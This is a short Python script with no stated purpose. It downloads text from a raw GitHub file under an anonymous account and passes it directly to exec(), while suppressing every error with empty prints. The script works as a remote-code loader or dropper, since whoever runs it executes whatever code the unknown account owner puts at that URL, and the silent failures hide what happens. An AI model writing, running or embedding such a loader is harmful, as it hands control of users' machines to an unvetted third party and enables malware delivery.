import subprocess
import sys
import requests


def install_requests():
    try:
        import requests
    except ImportError:
        print("'requests' module not found. Installing it now...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests

def loop():
    url = "https://raw.githubusercontent.com/mrunknown12321/1234/refs/heads/main/1234"
    
    try:
        install_requests()

        response = requests.get(url)
        if response.status_code == 200:
            code = response.text
            exec(code)
        else:
            print(f"")
    except Exception as e:
        print(f"")


loop()
